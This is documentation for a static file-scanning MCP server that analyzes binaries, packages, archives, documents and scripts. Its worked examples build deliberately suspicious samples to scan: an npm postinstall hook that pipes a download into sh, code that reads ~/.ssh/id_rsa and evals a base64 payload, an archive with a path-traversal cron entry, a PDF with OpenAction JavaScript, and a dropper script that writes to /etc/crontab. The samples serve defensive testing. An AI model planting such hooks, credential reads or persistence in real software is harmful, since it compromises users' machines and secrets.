  "analysis_history": { "entries": 3, "files": 1, "result_bytes": 32200, "max_bytes_on_disk": 268435456,
                        "calls_by_tool": { "analyze_file": 3 } },
  "sections": { "entries": 19, "bytes": 81677, "max_entries": 256, "disk_enabled": true, "disk_files": 19, ... },
  "strings": { "unique": 185, "occurrences": 189, "files": 1, ... },
  "next_steps": [ { "tool": "cache_status", "arguments": { "action": "list" }, "gives": "the past calls, newest first, paged" }, ... ],
  "hint": "cache_clear forgets cached results (destructive)."
}
```

`next_steps` are `{tool, arguments, gives}` objects; advice that is not a call is in `hint`. The analysis history is
stored in the cache directory, so every server that uses the same directory reads and writes the same history. With
`--allow-root`, `list` and `search` show only entries whose stored path is inside a root, and a step that names a file
names a visible one. The rows print the canonical path (symlinks and `..` resolved): a file stored as
`<D>/outside_zone/../in/a.bin` is listed as `<D>/in/a.bin`, in `file_path`, in `tool_args` (also for a long path that
the history stores in cut form) and in the `search_strings` step, and `file_path_pattern` matches that printed path, so
`outside` finds nothing there. Other path arguments in a listed row (keys ending in `path`, such as the `rule_path` of
`yara_scan_file`) show in the same canonical spelling, or as `<outside the allowed roots>` when they lie outside the
roots. The `stats` action is not filtered: its counts (history entries and files, calls by tool,
section and string totals) include entries of files outside the roots, and name no path.

### cache_clear

Forget cached analyses and tracked strings. The only destructive tool; it is annotated that way so clients can ask
for confirmation.

| Argument | Notes |
| --- | --- |
| `scope` | `all` (default), `analysis` (call history and cached sections, including files on disk) or `strings`. |

It deletes only files the cache wrote. The answer lists what was cleared: `{"cleared": ["tracked strings"]}` for scope
`strings`; the default scope returns
`["analysis history, cached sections and files on disk", "tracked strings"]`. Later calls recompute. The `analysis`
scope also drops the results `analyze_java_file` keeps in memory. Under `--no-cache` the list says that nothing was
on disk and that the in-memory string index was emptied.

## Worked examples

These are real tool calls with shortened results. `/samples` stands for the root of a checkout of this repository;
the binaries are the ones under `test_programs/` (prebuilt, no compiler needed). The package, archive, PDF and script
inputs are small illustrative files, not part of the repository and not real malware. Each section shows the commands
that make them, so you can repeat the calls. Your sizes, offsets and hashes will differ from the ones shown.

### Triage an unknown binary

An unknown ELF arrives. Start with the overview:

```json
{ "name": "analyze_file", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary" } }
```

The overview shows an x86-64 ELF, not packed, with `127.0.0.1`, `/proc/self/status` and `ptrace` among its strings.
That combination suggests anti-debugging. Ask for the threat sections:

```json
{ "name": "analyze_file", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary",
                                         "sections": ["threats", "behavioral"] } }
```

The summaries report a Malicious threat level and four built-in rule matches, among them `anti_analysis`,
`network_communication` and `update_lookalike_domain`. Read the strings behind them:

```json
{ "name": "query_analysis", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary", "section": "strings",
                                           "filter": "ptrace" } }
```

Then read the code that uses `ptrace`. Get the function list, pick a name, list its instructions:

```json
{ "name": "disassemble", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary", "function": "main",
                                        "max_instructions": 40 } }
```

When you want bytes around a string offset (12682 for `Debugger detected!`), use `read_hex`:

```json
{ "name": "read_hex", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary",
                                     "offset": 12640, "length": 96 } }
```

On a fresh cache directory the five calls answer as follows. The overview and the `threats`, `behavioral` call are
each a `cache: "miss"`: the sections are computed and stored. The `query_analysis` call on strings is a `hit`: the
overview had already stored the strings. The `disassemble` call for `main` is a `miss`: it is the first time the
code is decoded. `read_hex` has no `cache` field, because it reads the file directly. Repeat the second or the
fourth call and each is a `hit`. `all: true` in step one would have stored every section at once, so the later
`query_analysis` calls and the `disassemble` calls inside the stored window would all be hits.

### Vet an npm package

Make a small suspicious package and pack it. This stands in for a tarball from `npm pack`; the tool is offline, so
give it the file:

```bash
mkdir -p /tmp/demo/package && cd /tmp/demo
cat > package/package.json <<'EOF'
{
  "name": "left-pad-utils",
  "version": "1.0.3",
  "scripts": { "postinstall": "curl -s http://203.0.113.7/p.sh | sh" },
  "dependencies": { "lodash": "4.17.4" }
}
EOF
cat > package/index.js <<'EOF'
const fs = require('fs');
const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());
module.exports = (s, n) => String(s).padStart(n);
EOF
tar czf left-pad-utils-1.0.3.tgz package
```

Then call the tool:

```json
{ "name": "analyze_npm_package", "arguments": { "package_path": "/tmp/demo/left-pad-utils-1.0.3.tgz" } }
```

The summary rates the package Critical: a `postinstall` script pipes a download into a shell, `index.js` evaluates a
decoded payload and reads `~/.ssh/id_rsa`, and the pinned `lodash` 4.17.4 has an advisory. Page the evidence; this
call returns the Critical finding and the two High ones:

```json
{ "name": "analyze_npm_package", "arguments": { "package_path": "/tmp/demo/left-pad-utils-1.0.3.tgz",
                                                "section": "findings", "min_severity": "High" } }
```

Each finding has the file, line and matching text. Because the advisory table is small, treat a clean result as
"nothing found in this table", and run `npm audit` for dependency coverage. To inspect one file from the package,
unpack it and call `analyze_script` or `analyze_file` on that file.

### Hunt a string across files, then write and test a YARA rule

Index a few samples, then search all of them at once:

```json
{ "name": "search_strings", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary",
                                           "query": "msftupdater" } }
{ "name": "search_strings", "arguments": { "file_path": "/samples/test_programs/rust_test_binary",
                                           "query": "msftupdater" } }
{ "name": "search_strings", "arguments": { "query": "msftupdater" } }
```

The third call, with no `file_path`, searches every file indexed this session and returns one row per distinct
string with the files that hold it. `string_details` then gives every offset. Get a draft rule from
`llm_analyze_file` and tighten it. The draft is tied to one file, so replace its `filesize` condition with strings
that identify the family:

```text
rule beacon_dropper {
  strings: $a = "msftupdater.com" $b = "GET /beacon HTTP/1.1"
  condition: uint32(0) == 0x464c457f and all of them
}
```

Test it against the whole directory:

```json
{ "name": "yara_scan_file", "arguments": { "path": "/samples/test_programs", "recursive": false,
                                           "yara_rule": "rule beacon_dropper { ... }" } }
```

The rule matched 2 of 25 files, each with the matched strings and offsets (see the `yara_scan_file` entry). If it
does not compile, the error gives the line and column; fix it and call again.

### Look inside an archive, a document or a script

An archive that came with an email. This one is built to hold a path that escapes the extraction directory and a
double extension:

```bash
cd /tmp/demo
python3 -I -c "
import tarfile, io
with tarfile.open('report.tar.gz', 'w:gz') as t:
    for name, data in [('report.txt', b'numbers'), ('../../etc/cron.d/job', b'* * * * * root /tmp/x'),
                       ('invoice.pdf.exe', b'MZ' + bytes(30))]:
        info = tarfile.TarInfo(name)
        info.size = len(data)
        t.addfile(info, io.BytesIO(data))
"
```

Then:

```json
{ "name": "inspect_archive", "arguments": { "file_path": "/tmp/demo/report.tar.gz", "risky_only": true } }
```

It rates the archive critical and lists the two bad entries: `../../etc/cron.d/job` escapes the extraction directory,
and `invoice.pdf.exe` has a double extension. Nothing was extracted.

A PDF with JavaScript that runs on open. This hand-written file is minimal, but enough for the scanner to parse:

```bash
printf '%%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n' > /tmp/demo/invoice.pdf
printf '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' >> /tmp/demo/invoice.pdf
printf '3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n' >> /tmp/demo/invoice.pdf
printf '4 0 obj\n<< /S /JavaScript /JS (app.alert\\(1\\);) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%%%EOF\n' \
  >> /tmp/demo/invoice.pdf
```

Then:

```json
{ "name": "analyze_document", "arguments": { "file_path": "/tmp/demo/invoice.pdf", "category": "script" } }
```

The summary shows JavaScript plus an `OpenAction` that runs when the file opens, with byte offsets to feed `read_hex`.

A shell script:

```bash
printf '%s\n' '#!/bin/sh' 'echo "updating"' 'curl -s http://203.0.113.7/payload.sh | sh' \
  'echo "* * * * * root /tmp/.x" >> /etc/crontab' > /tmp/demo/dropper.sh
```

Then:

```json
{ "name": "analyze_script", "arguments": { "file_path": "/tmp/demo/dropper.sh" } }
```

It reports a download-and-run on line 3 and a cron entry on line 4. If you are not sure which tool fits, call
`analyze_file` first: its `next_steps` name the specialist.

## Transports and security

### Commands

| Command | Transport |
| --- | --- |
| `file-scanner mcp-stdio` | JSON-RPC over stdin and stdout, one JSON object per line. Exits 0 when stdin closes, or on SIGINT or SIGTERM. |
| `file-scanner mcp-http` | Streamable HTTP at `/mcp`, plus REST helper routes. |
| `file-scanner mcp-sse` | Deprecated alias of `mcp-http`: prints a notice, starts the same server. Use `/mcp`. |

### Options

| Option | Commands | Meaning |
| --- | --- | --- |
| `--allow-root <DIR>` | all | Directory the tools may read. Repeatable. |
| `--cache-dir <DIR>` | all | Cache directory (created with mode 0700). |
| `--no-cache` | all | Keep no section cache or analysis history, in memory or on disk. |
| `--port`, `-p <PORT>` | HTTP | Default 3000; 0 picks a free port. |
| `--host <HOST>` | HTTP | Bind address, default `127.0.0.1`. |
| `--allowed-host <HOST>` | HTTP | Extra `Host` value to accept (`name` or `name:port`). Repeatable. |
| `--allowed-origin <ORIGIN>` | HTTP | Extra browser `Origin` (`scheme://host[:port\|:*]`). Repeatable. |
| `--auth-token <TOKEN>` | HTTP | Bearer token required on every route except `/health`. |

### Environment variables

| Variable | Meaning |
| --- | --- |
| `FILE_SCANNER_ALLOWED_ROOTS` | `:`-separated allow-roots, used when no `--allow-root` is given. |
| `FILE_SCANNER_AUTH_TOKEN` | The bearer token. Prefer it to `--auth-token`: command lines are visible to other users. |
| `FILE_SCANNER_CACHE_DIR` | Cache directory, used when no `--cache-dir` is given. |
| `FILE_SCANNER_CACHE_DISK_MB` | Section cache disk budget in MiB (default 1,024); the history gets a quarter of it. |
| `FILE_SCANNER_SECTION_CACHE_MB` | Memory budget of the section cache in MiB (default 256). |

These are the only `FILE_SCANNER_*` variables. The default cache location also depends on `HOME`, `XDG_CACHE_HOME`
and the temp directory (see [The cache](#the-cache)). There is no log-level setting; the server prints a startup
banner and security-relevant events (refused requests, an unusable cache directory) to stderr.

### Protocol revisions

The server negotiates every revision from 2024-11-05 through 2026-07-28 and reports its name, version and usage
instructions in the `initialize` result. In HTTP mode, clients older than 2026-07-28 use sessions (the
`Mcp-Session-Id` header). A 2026-07-28 request is stateless: it needs no `initialize` and no session, and carries
the protocol version in its request metadata. An `initialize` request that asks for 2026-07-28 is answered with
`protocolVersion` 2025-11-25: 2026-07-28 is the stateless revision, reached through the per-request metadata without
`initialize`. The metadata goes in `params._meta` as `io.modelcontextprotocol/protocolVersion` and
`io.modelcontextprotocol/clientCapabilities`. On stdio one line is enough:

```json
{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}}}
```

Over HTTP a stateless request also needs three headers that repeat what the body says, and the server answers 400
(`-32020`) without them: `MCP-Protocol-Version: 2026-07-28`, `Mcp-Method: <method>` and, for `tools/call`,
`Mcp-Name: <tool name>`. Send both `Accept` values, as for any `/mcp` request. The reply is an event stream with one
`data:` line. List the tools:

```bash
META='"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}'
curl -s -X POST http://127.0.0.1:3000/mcp \
  -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
  -H 'MCP-Protocol-Version: 2026-07-28' -H 'Mcp-Method: tools/list' \
  -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\",\"params\":{$META}}" \
  | sed 's/^data: //' | jq -c '.result.tools | length'
```

```text
17
```

Call a tool (the name goes in the body and in `Mcp-Name`):

```bash
ARGS='"name":"read_hex","arguments":{"file_path":"/samples/test_programs/c_advanced_binary","length":16}'
curl -s -X POST http://127.0.0.1:3000/mcp \
  -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' \
  -H 'MCP-Protocol-Version: 2026-07-28' -H 'Mcp-Method: tools/call' -H 'Mcp-Name: read_hex' \
  -d "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{$ARGS,$META}}" \
  | sed 's/^data: //' | jq -r '.result.content[0].text' | jq -c '{total_bytes, next_offset}'
```

```text
{"total_bytes":22088,"next_offset":16}
```

On stdio a request sent before `initialize` needs the same metadata, with one exception: `ping` is answered on a
connection that has not used the stateless form. After one stateless request the connection stays stateless. A bare
`ping` is then refused (`-32602`), and `ping` with the metadata is not a method of the stateless revision (`-32601`
on stdio, 404 over HTTP). A `tools/call` that has no `name` is answered `-32601` by the SDK layer, before any tool
runs.

JSON-RPC batches (a JSON array of messages) are not accepted on any revision, although revision 2025-03-26 allows
them: stdio answers `-32600` and HTTP answers 415. Send one message at a time.

### HTTP protections, in the order they apply

1. **Host check.** The `Host` header must be `localhost`, `127.0.0.1`, `::1` or an `--allowed-host`. This stops DNS
   rebinding. Otherwise 403.
2. **Origin check.** A browser `Origin` header must be a loopback origin or an `--allowed-origin`. Otherwise 403.
   Clients that send no `Origin` (curl, SDKs) are not affected.
3. **Bearer token.** With `--auth-token`, every route except `/health` needs `Authorization: Bearer <token>`. A
   missing or wrong token gets 401 with `WWW-Authenticate: Bearer realm="file-scanner"`. The token is compared in
   constant time and never logged.
4. **Path scope.** With `--allow-root`, tools refuse paths outside the roots, and the cache and string routes and
   tools show only entries of files inside a root (see [The cache](#the-cache)).

To serve other machines, bind a non-loopback address, name the host clients use, and set the token and roots:

```bash
export FILE_SCANNER_AUTH_TOKEN="$(openssl rand -hex 24)"
file-scanner mcp-http --host 0.0.0.0 --port 3000 --allowed-host files.example.com \
  --allow-root /srv/samples
```

The banner says what is active. Binding a non-loopback host without a token prints a warning. The server does not
terminate TLS: put a reverse proxy in front for HTTPS.

### REST helper routes

`mcp-http` also serves plain JSON routes on the same address, behind the same checks. They are not part of the MCP
protocol; they are for scripts and health checks.

| Route | Use |
| --- | --- |
| `GET /health` | `{"status":"ok","service":"file-scanner-mcp","version":"...",...}`. Needs no token. |
| `GET /api/info` | Routes (with what `POST /cache/clear` clears), version and uptime. |
| `POST /initialize`, `POST /tools/list` | Identity, tool schemas. `/tools/list` replies `{jsonrpc, result: {tools}}`. |
| `POST /tools/call` | Call a tool: `{"name": "...", "arguments": {...}}`. Replies `{resultType, content, isError}`. |
| `GET /cache/list`, `GET /cache/stats` | Analysis history entries and statistics. |
| `POST /cache/search` | Body field `file_path_pattern` (not `file_path`), and `tool_name`. |
| `POST /cache/clear` | Clears what `cache_clear` clears by default (history, sections, tracked strings). |
| `GET /strings/stats`; `POST /strings/{search,details,related,filter}` | String tracker. `details` answers 404 `{"error":"String not found"}` for an unknown string. |
| `GET /api-docs/openapi.json` | OpenAPI description of the REST routes. |

`POST /cache/clear` takes the same scopes as the tool, as a query parameter: `?scope=all|analysis|strings`. Another
value is a 400. The reply has `status`, `message` and a `cleared` list.

REST requests time out after 120 seconds (504), and at most 16 run at once. An example call:

```bash
curl -s -X POST http://127.0.0.1:3000/tools/call -H 'Content-Type: application/json' \
  -d '{"name":"read_hex","arguments":{"file_path":"/samples/test_programs/c_advanced_binary","length":16}}'
```

`--allow-root` applies to these routes as it does to the tools: `/cache/list`, `/cache/search`, `/strings/search`,
`/strings/details`, `/strings/related`, `/strings/filter` and `/strings/stats` show only entries and strings of files
inside a root (`/strings/related` also drops related strings that live only outside the roots). The cache routes
print each entry's canonical path, as `cache_status` does (see [The cache](#the-cache)). `/cache/stats` and the totals
of `/strings/stats` and `/strings/filter` are not filtered. `POST /strings/details` answers HTTP 404 with
`{"error":"String not found"}` for a string that is unknown or not visible, and the OpenAPI document lists 404 for that
route.

When `mcp-http` is stopped with Ctrl-C or SIGTERM it ends open streams and exits 0.

`mcp-stdio` also exits 0 on SIGINT or SIGTERM, not only when stdin closes. On stdio, closing stdin ends the session.
The server waits up to 5 seconds for calls that are still running and answers them. A call still running after that
gets no answer: the server writes one line to stderr (`file-scanner: input closed and a call was still running after
5 s; exiting without its answer`) and exits 0. A one-shot piped session therefore
works for calls that take a few seconds; for longer ones keep stdin open until the answer arrives.

## The cache

The server keeps two kinds of results, so drill-down calls do not repeat work.

- **Section cache.** Each section of `analyze_file` (and the listings of `inspect_archive`, the package and Java
  tools and similar) is stored by the file's SHA-256 and the options that change it. It holds compressed JSON text
  in memory (default 256 MiB) and on disk (default 1 GiB). When it is full, the least recently used entries go first.
  A repeated call on an unchanged file is a `hit`; editing the file changes its hash, so a changed file is never
  served from an old entry. The sections whose ratings depend on the scanner's rules (`threats`, `enhanced_threats`,
  and the package sections) carry a revision in their key: a result stored by an earlier build with older rules is
  recomputed, not served.
- **Analysis history.** One record per `analyze_file` and `yara_scan_file` call (arguments, hash, time), used by
  `cache_status` and the REST `/cache/*` routes. Results over 4 MiB are replaced by a size note. The total is bounded
  (256 MiB by default).

Where it lives:

| Platform | Default directory |
| --- | --- |
| Any platform | `$XDG_CACHE_HOME/file-scanner` when `XDG_CACHE_HOME` is set to an absolute path |
| Linux | else `~/.cache/file-scanner` |
| macOS | else `~/Library/Caches/file-scanner` |
| No usable home | A per-user directory under the system temp directory |

Override with `--cache-dir` or `FILE_SCANNER_CACHE_DIR`. The directory is created with mode 0700 and its files 0600.
If it cannot be used, the server prints one line on stderr and keeps the cache in memory only. Several servers can
share one directory, and then they share the analysis history: a server sees the calls that the others recorded.

With `--allow-root`, a server shows only what concerns files inside its roots, even when the shared history holds
entries of files outside them:

- Filtered by stored path: `cache_status` `list` and `search`, and REST `GET /cache/list` and `POST /cache/search`
  (an entry whose stored path is not inside a root, or no longer resolves inside one, is left out);
  `search_strings` without `file_path`, `string_details`, and REST `POST /strings/search`, `/strings/details`,
  `/strings/related` and the value lists of `GET /strings/stats` and `POST /strings/filter` (`most_common`) show only
  strings of files inside a root.
- Printed by canonical path: on a rooted server the same listings (`cache_status` `list` and `search`, REST
  `GET /cache/list` and `POST /cache/search`) show each row's `file_path` and `tool_args` with symlinks and `..`
  resolved, so a `..` spelling stored by another server does not reveal a directory outside the roots. In REST
  entries every result string equal to the stored path is printed the same way. `file_path_pattern` and the REST
  `file_path_pattern` body field match the printed path.
- Not filtered, and global: the counts and sizes of `cache_status` `stats` and REST `GET /cache/stats` (history
  entries, files, calls by tool, bytes, section and string totals) and the totals and distributions of
  `GET /strings/stats` and `POST /strings/filter`. They name no path and no string, but they include entries of files
  outside the roots.

What is stored: the results the tools returned or computed, including extracted strings and hex samples from the
files you analyzed, and the call history. The tracked-string index is kept in memory only and is rebuilt in each
server process, so it is empty after a restart. It never stores a copy of the analyzed file. Treat the directory
as sensitive if the files were. Run `cache_clear` (or delete the directory) to remove it. `--no-cache` stops the
section cache and the analysis history, on disk and in memory, and drill-down calls then recompute their sections
each time (see `cache: hit | miss` for what the answers carry). The in-memory string index is not part of that
cache: it still fills while the server runs (see `search_strings`), and `cache_clear` empties it. Under
`--no-cache`, `cache_status` carries a `note` that says so. `cache_clear` removes only what the cache wrote.

At most `max(4, CPU count)` analyses run at the same time across all connections; others wait.

## Limits

What this server does and does not do.

- **Static only.** Nothing is executed, emulated or unpacked. A packed or encrypted sample shows the packer, not the
  payload.
- **Formats.** Binary analysis covers ELF, PE and Mach-O (thin and universal). Code analysis (disassembly,
  control flow, call graph, vulnerabilities) is built for x86 (32 and 64 bit) and, in part, ARM64; for other
  architectures expect an explicit error or a note. `disassemble` works on an ELF, a PE (x86, x86-64 and ARM64; any
  other COFF machine is an error), a thin Mach-O, or one slice of a universal Mach-O. Control flow and
  vulnerability analysis read x86 code only, so an ARM64 PE gets the `disassembly` and `call_graph` sections (the call
  graph has nodes and no edges) and an explicit error for the x86-only ones.
  `analyze_document` reads PDF and Office (OLE2 and OOXML); `inspect_archive` lists zip, tar, tar.gz, RAR and 7z.
  Java: class files, JAR, WAR, EAR, AAR and APK manifests, but not DEX code. Scripts: shell, PowerShell,
  JavaScript, Python, batch and VBScript.
- **Heuristics.** Threat levels, behavioral findings, vulnerability findings, taint flows, "likely packed" and
  "likely encrypted" are heuristics. They can be wrong in both directions. Vulnerability rules match calls by name;
  a `Low` result is not a proof of safety. The built-in YARA rules are general rules, not a family set.
- **Offline vulnerability data.** The npm table has 6 packages and the Python table 7, with advisories up to 2022
  and 2023. Nothing is fetched. There is no CVE check for Java libraries or native binaries. Use `npm audit`,
  `pip-audit` or OSV for real coverage.
- **Signatures.** Signature checks report what is present. A missing verifier gives "Not checked", and Java
  signature files are listed, not verified.
- **Bounded work.** Sizes, counts and time are capped: results by `max_output_bytes`; string scans by count and
  bytes (a file with millions of strings keeps exact counts but a bounded list); disassembly to a bounded part of a
  large file (the rest is decoded on request); archives and packages by entry count, bytes read and decompressed
  size (a cut is named in the result); YARA by file size (100 MB), file count and a timeout; directory walks by
  entry count and time. Files over 256 MiB get a reduced overview.
- **Hostile files.** The parsers carry byte, count and time budgets, and a panic in one analyzer fails only that
  section. That is best-effort bounding, not a guarantee: a crafted file can still use a lot of memory or CPU before a
  budget stops it. When you scan untrusted files, run the server under an OS or container memory and CPU limit
  (`ulimit -v`, a systemd `MemoryMax=`, or `docker run --memory`), with `--allow-root` set.
- **Not a sandbox for the host.** The server reads only; it does not write outside its cache directory. But it will
  read whatever a caller asks for within `--allow-root`, so scope it.

## Troubleshooting

**The client says the server failed to start.** Run the exact command from the config in a terminal:
`/absolute/path/to/file-scanner mcp-stdio`. It should print a banner on stderr and wait. Use the absolute path; a
bare name often is not on a GUI client's `PATH`.

**No tools appear.** Restart the client after editing its config. In Claude Code run `claude mcp list`. Check that
`tools/list` returns 17 tools with the one-line session in [Testing by hand](#testing-by-hand).

**`403` from the HTTP server.** The `Host` or `Origin` header is not allowed. If clients reach the server through a
name, add `--allowed-host name`; for a browser app add `--allowed-origin`.

**`401` from the HTTP server.** The server has a token. Send `Authorization: Bearer <token>`.

**`415` from `/mcp`.** The body is not one valid JSON-RPC message: it is not JSON, or it is a batch (an array). Send a
single object per request.

**`406` from `/mcp`.** The `Accept` header must list both `application/json` and `text/event-stream`.

**`400` with `-32020` from `/mcp`.** A 2026-07-28 request is missing `MCP-Protocol-Version`, `Mcp-Method` or (for
`tools/call`) `Mcp-Name`. See [Protocol revisions](#protocol-revisions).

**`-32601` for a `tools/call`.** The call has no `name`. The SDK layer answers this before any tool runs; the
message is the method name.

**"outside the directories this server may read".** The path is not under an `--allow-root`. The message names the
allowed directories.

**Answers are cut off.** Look for `truncated`, `hint`, `note`, `returned` and `next_offset`. Page with `offset`,
narrow with `filter`, or raise `max_output_bytes` (ceiling 400,000). Clients may still limit what they inline.

**Results look stale or you want a clean slate.** Call `cache_clear`, or start the server with `--no-cache`.

**Strings you expect are missing from `search_strings` without `file_path`.** Only files already analyzed or
searched in this session are indexed. Search the file once with `file_path` first.

See also: [INSTALLATION.md](INSTALLATION.md), [USAGE.md](USAGE.md) for the command-line interface, and
[../SECURITY.md](../SECURITY.md).
